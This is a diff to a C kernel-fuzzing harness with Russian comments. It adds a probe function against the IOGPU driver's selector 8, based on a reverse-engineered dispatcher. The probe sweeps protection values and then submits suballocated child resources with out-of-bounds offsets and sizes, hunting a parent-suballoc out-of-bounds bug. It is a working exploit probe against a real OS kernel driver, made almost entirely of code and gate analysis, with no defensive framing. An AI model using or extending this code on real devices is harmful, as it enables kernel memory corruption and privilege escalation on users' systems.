@@ -43991,6 +43991,163 @@ static void p_bq88(void) {
     fsync(fileno(stderr));
 }
 
+// bq89 sel8 suballoc-CHILD: resType=0 + flag(+0x15 bit3) + parent(+0x50).
+// buffer/base ядро использует ТОЛЬКО как разность (offset), size != 0 (гейт).
+static uint32_t bq89_child(io_connect_t c, uint8_t *in, uint8_t *out,
+                           uint32_t parent, uint64_t prot,
+                           uint64_t buffer, uint64_t base, uint64_t size,
+                           kern_return_t *krp) {
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x00;           // resType 0 → suballoc-ветка (!не 0x80)
+    *(uint64_t *)(in + 0x18) = prot;           // protection (гейт popcount == parent+0x14)
+    *(uint32_t *)(in + 0x30) = 64;             // width
+    *(uint32_t *)(in + 0x34) = 64;             // height
+    in[0x15] = 8;                              // bit 3 = suballoc flag
+    *(uint32_t *)(in + 0x50) = parent;         // parent_resource_id
+    *(uint64_t *)(in + 0x38) = buffer;         // client_buffer
+    *(uint64_t *)(in + 0x40) = base;           // client_base
+    *(uint64_t *)(in + 0x48) = size;           // size (гейт != 0)
+    size_t osz = 0x58; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100,
+                                           NULL, 0, out, &osz);
+    if (krp) *krp = kr;
+    return *(uint32_t *)(out + 0x24);
+}
+
+// p_bq89 — v249: PARENT-SUBALLOC OOB (§240) v3 — точный реверс диспетчера.
+// Полный разбор FUN_24c40a4: suballoc-ветка достижима ТОЛЬКО при resType==0
+// (uVar2<0x40 → uVar2==0 → uVar3=parent_id → FUN_24b11e4(uVar13=0)); resType==0x80
+// уходит в нормальный путь FUN_24d64810 (wire client buffer) — v2 целил МИМО.
+// Гейты FUN_24b11e4 (b4==435 до фикса): parent lookup "from shared";
+// popcount(child_prot)==parent+0x14; parent byte+0x10 &0x7f==0 (IOSurface 0x82
+// НЕ проходит, plain texture 0x80 — ДА); parent+0x28!=0; size!=0; затем b4 сразу
+// plVar2[9]=buffer-base AS-IS; 27.0 добавил reject "precedes client_base" +
+// "exceeds parent memory size" (offset<parent_size && size<=parent_size-offset).
+// => parent = rid_ctl (0x80-текстура из client buffer, prot 0), child resType=0.
+// Структура sel8 (uint*): +0x00 resType, +0x04 cache_mode, +0x18 protection u64,
+// +0x30/+0x34 w/h, +0x38 client_buffer u64 (=IOSurface ID u32 при 0x82),
+// +0x40 client_base u64, +0x48 size u64, +0x50 parent rid u32, байт +0x15
+// бит 3 = suballoc flag.
+static void p_bq89(void) {
+    LOG("[bq89] v249: parent-suballoc OOB v3 — resType=0 child + 0x80-parent (§240/§241)");
+    fsync(fileno(stderr));
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[bq89] IOGPU type-1 open FAILED"); return; }
+    LOG("[bq89] conn 0x%x", c);
+
+    // ==== 0. CONTROL §144: обычный sel8 texture (resType 0x80) должен работать ====
+    uint8_t *in = must_map(0x1000), *out = must_map(0x1000);
+    uint8_t *buf1 = must_map(0x4000);
+    memset(buf1, 0x33, 0x4000);
+    uint32_t rid_ctl = 0;
+    {
+        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 0x80;
+        *(uint32_t *)(in + 0x30) = 1;
+        *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
+        *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+        *(uint64_t *)(in + 0x48) = 0x4000;
+        size_t osz = 0x58; uint32_t nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100,
+                                               NULL, 0, out, &osz);
+        rid_ctl = *(uint32_t *)(out + 0x24);
+        LOG("[bq89] CONTROL sel8 texture(0x80): kr=%#x rid=%u %s", kr, rid_ctl,
+            kr == 0 && rid_ctl ? "OK — база жива" : "*** CONTROL FAILED ***");
+        fsync(fileno(stderr));
+    }
+
+    // ==== 1. PARENT = rid_ctl (0x80, prot 0) — единственный кандидат, чей byte+0x10
+    // проходит гейт &0x7f==0. NEG-КОНТРОЛЬ: IOSurface-родитель (тип 0x82) —
+    // при верной модели гейтов ожидаем reject ("parent resource type mismatch").
+    uint32_t rid_surf = 0;
+    IOSurfaceRef sf = make_surface(64, 64);
+    IOSurfaceID sid = sf ? IOSurfaceGetID(sf) : 0;
+    LOG("[bq89] IOSurface %p id %u", (void *)sf, sid);
+    {
+        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 0x82;
+        *(uint32_t *)(in + 0x38) = sid;
+        *(uint32_t *)(in + 0x44) = 1;   // plane count
+        size_t osz = 0x58; uint32_t nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100,
+                                               NULL, 0, out, &osz);
+        rid_surf = *(uint32_t *)(out + 0x24);
+        LOG("[bq89] NEG-CTL parent surf(0x82) sid=%u: kr=%#x rid=%u", sid, kr, rid_surf);
+        fsync(fileno(stderr));
+    }
+    if (!rid_ctl) { LOG("[bq89] abort: нет 0x80-родителя (CONTROL FAILED)"); return; }
+    LOG("[bq89] PARENT primary = rid_ctl(%u, тип 0x80, prot 0); NEG = rid_surf(%u)",
+        rid_ctl, rid_surf);
+
+    // ==== 2. PROTSWEEP: измеряем parent+0x14 (гейт popcount(child_prot)==parent+0x14) ====
+    uint64_t bestp = 0; int prot_ok = -1;
+    for (uint64_t p = 0; p < 0x10; p++) {
+        kern_return_t kr = 0xe00002be;
+        uint32_t rid = bq89_child(c, in, out, rid_ctl, p,
+                                  (uint64_t)(uintptr_t)buf1,
+                                  (uint64_t)(uintptr_t)buf1, 0x100, &kr);
+        LOG("[bq89] PROTSWEEP prot=%#llx: kr=%#x rid=%u %s",
+            (unsigned long long)p, kr, rid,
+            kr == 0 ? "*** PROT PASS → parent+0x14 == popcount(prot) ***" : "gate");
+        if (kr == 0 && prot_ok < 0) {
+            prot_ok = (int)p; bestp = p;
+            hexdump("[bq89] prot-out", out, 0x58);
+        }
+        fsync(fileno(stderr));
+        usleep(60000);
+    }
+    if (prot_ok < 0) bestp = 0;
+    LOG("[bq89] PROTSWEEP итог: проходящий prot=%#llx", (unsigned long long)bestp);
+
+    // ==== 3. CASE MATRIX: parent=rid_ctl, prot=bestp; offset = buffer - base ====
+    // b4: offset AS-IS (27.0 добавил "precedes" + "exceeds parent" reject'ы).
+    struct {
+        const char *what; int oob;
+        uint64_t buffer, base, size;
+    } cases[] = {
+        {"ctl D=0", 0,
+         (uint64_t)(uintptr_t)buf1, (uint64_t)(uintptr_t)buf1, 0x100},
+        {"ctl D=+0x100 (внутри)", 0,
+         (uint64_t)(uintptr_t)buf1 + 0x100, (uint64_t)(uintptr_t)buf1, 0x100},
+        {"OOB D=+0x100000", 1,
+         (uint64_t)(uintptr_t)buf1 + 0x100000, (uint64_t)(uintptr_t)buf1, 0x1000},
+        {"OOB D=+0x10000000", 1,
+         (uint64_t)(uintptr_t)buf1 + 0x10000000, (uint64_t)(uintptr_t)buf1, 0x1000},
+        {"OOB D=-0x100000 (buffer<base)", 1,
+         (uint64_t)(uintptr_t)buf1 - 0x100000, (uint64_t)(uintptr_t)buf1, 0x1000},
+        {"OOB size=0x100000 > parent", 1,
+         (uint64_t)(uintptr_t)buf1, (uint64_t)(uintptr_t)buf1, 0x100000},
+    };
+    int ncases = sizeof(cases) / sizeof(cases[0]);
+    for (int i = 0; i < ncases; i++) {
+        kern_return_t kr = 0xe00002be;
+        uint32_t rid = bq89_child(c, in, out, rid_ctl, bestp,
+                                  cases[i].buffer, cases[i].base, cases[i].size,
+                                  &kr);
+        LOG("[bq89] CHILD %d/%d %-32s kr=%#x rid=%u %s", i + 1, ncases,
+            cases[i].what, kr, rid,
+            kr == 0 ? (cases[i].oob ? "*** OOB ПРИНЯТ (БАГА §240!) ***" : "OK")
+                    : (cases[i].oob ? "rejected" : "*** CONTROL FAILED ***"));
+        if (kr == 0) hexdump("[bq89] child-out", out, 0x58);
+        fsync(fileno(stderr));
+        usleep(80000);
+    }
+
+    // ==== 4. NEG-КОНТРОЛЬ: parent=rid_surf (тип 0x82 — гейт parent type) ====
+    if (rid_surf) {
+        kern_return_t kr = 0xe00002be;
+        uint32_t rid = bq89_child(c, in, out, rid_surf, 0,
+                                  (uint64_t)(uintptr_t)buf1,
+                                  (uint64_t)(uintptr_t)buf1, 0x100, &kr);
+        LOG("[bq89] NEGCTL surf-parent ctl: kr=%#x rid=%u %s", kr, rid,
+            kr == 0 ? "*** ГЕЙТ ТИПА НЕ РАБОТАЕТ — модель неверна ***"
+                    : "rejected (0x82&0x7f=2≠0 — ожидаемо)");
+        fsync(fileno(stderr));
+    }
+    LOG("[bq89] ИТОГ v3: prot-гейт измерен, матрица завершена (живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -52593,6 +52750,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ86")) { p_bq86(); LOG("[probe13] bq86-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ87")) { p_bq87(); LOG("[probe13] bq87-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ88")) { p_bq88(); LOG("[probe13] bq88-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ89")) { p_bq89(); LOG("[probe13] bq89-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
